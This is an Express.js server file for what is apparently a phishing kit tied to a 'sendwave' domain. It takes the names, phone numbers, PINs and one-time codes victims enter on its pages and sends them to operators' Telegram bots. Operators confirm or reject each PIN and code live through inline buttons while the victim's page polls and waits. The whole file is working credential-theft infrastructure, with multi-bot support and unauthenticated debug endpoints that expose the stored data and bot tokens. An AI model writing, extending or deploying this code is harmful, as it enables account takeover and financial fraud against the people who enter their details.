require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// ---------------- BACKEND DOMAIN (HARD-LOCKED) ----------------
const BACKEND_DOMAIN = 'https://sendwave-9mid.onrender.com';

// ---------------- MEMORY STORES ----------------
const approvedPins = {};
const approvedCodes = {};
const requestBotMap = {};

// ---------------- MULTI-BOT STORE (FROM .ENV) ----------------
const bots = [];

Object.keys(process.env).forEach(key => {
    const tokenMatch = key.match(/^BOT(\d+)_TOKEN$/);
    if (tokenMatch) {
        const id = `bot${tokenMatch[1]}`;
        const token = process.env[key];
        const chatIdKey = `BOT${tokenMatch[1]}_CHATID`;
        const chatId = process.env[chatIdKey];
        if (token && chatId) {
            bots.push({ botId: id, botToken: token, chatId });
        }
    }
});

console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

// ---------------- TELEGRAM HELPERS ----------------
async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
            { chat_id: bot.chatId, text, reply_markup: { inline_keyboard: inlineKeyboard } }
        );
        console.log("📤 Telegram message sent:", response.data.ok);
    } catch (err) {
        console.error("❌ Telegram send error:", err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
            { callback_query_id: callbackId }
        );
        console.log("✅ Callback answered");
    } catch (err) {
        console.error("❌ Callback answer error:", err.response?.data || err.message);
    }
}

// ---------------- AUTO-SET WEBHOOKS ----------------
async function setWebhookForBot(bot) {
    try {
        const webhookUrl = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;
        const resp = await axios.get(
            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`
        );
        console.log(`✅ Webhook set for ${bot.botId}:`, resp.data);
    } catch (err) {
        console.error(`❌ Failed webhook for ${bot.botId}:`, err.response?.data || err.message);
    }
}

async function setWebhooksForAllBots() {
    for (const bot of bots) {
        await setWebhookForBot(bot);
    }
}

// ---------------- ROUTES ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');
    res.redirect(`/index.html?botId=${bot.botId}`);
});

app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- PIN HANDLING ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;

    console.log("🟡 NEW PIN REQUEST");
    console.log("RequestID:", requestId);
    console.log("Bot:", botId);
    console.log("Current approvedPins:", approvedPins);

    sendTelegramMessage(bot,
        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
        [[
            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const value = approvedPins[req.params.requestId] ?? null;

    console.log("🔄 CHECK PIN STATUS");
    console.log("RequestID:", req.params.requestId);
    console.log("Stored Value:", value);
    console.log("Full Store:", approvedPins);

    res.json({ approved: value });
});

// ---------------- CODE HANDLING ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    console.log("🟣 NEW CODE REQUEST");
    console.log("RequestID:", requestId);
    console.log("Current approvedCodes:", approvedCodes);

    sendTelegramMessage(bot,
        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
        [[
            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    const value = approvedCodes[req.params.requestId] ?? null;

    console.log("🔄 CHECK CODE STATUS");
    console.log("RequestID:", req.params.requestId);
    console.log("Stored Value:", value);
    console.log("Full Store:", approvedCodes);

    res.json({ approved: value });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    console.log("📩 TELEGRAM UPDATE RECEIVED");
    console.log("Body:", JSON.stringify(req.body));

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');

    console.log("🔘 CALLBACK CLICKED");
    console.log("Action:", action);
    console.log("RequestID:", requestId);
    console.log("Before Update:", approvedPins);

    let feedback = '';

    if (action === 'pin_ok') {
        approvedPins[requestId] = true;
        feedback = `✅ PIN Approved for requestId: ${requestId}`;
    }
    if (action === 'pin_bad') {
        approvedPins[requestId] = false;
        feedback = `❌ PIN Rejected for requestId: ${requestId}`;
    }
    if (action === 'code_ok') {
        approvedCodes[requestId] = true;
        feedback = `✅ CODE Approved for requestId: ${requestId}`;
    }
    if (action === 'code_bad') {
        approvedCodes[requestId] = false;
        feedback = `❌ CODE Rejected for requestId: ${requestId}`;
    }

    console.log("After Update:");
    console.log("approvedPins:", approvedPins);
    console.log("approvedCodes:", approvedCodes);

    if (feedback) await sendTelegramMessage(bot, feedback);

    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- DEBUG ENDPOINTS ----------------
app.get('/debug/pins', (req, res) => res.json(approvedPins));
app.get('/debug/codes', (req, res) => res.json(approvedCodes));
app.get('/debug/request-map', (req, res) => res.json(requestBotMap));
app.get('/debug/bots', (req, res) => res.json(bots));

// ---------------- START SERVER ----------------
setWebhooksForAllBots().then(() => {
    app.listen(PORT, () =>
        console.log(`🚀 Server running on port ${PORT} (Domain: ${BACKEND_DOMAIN})`)
    );
});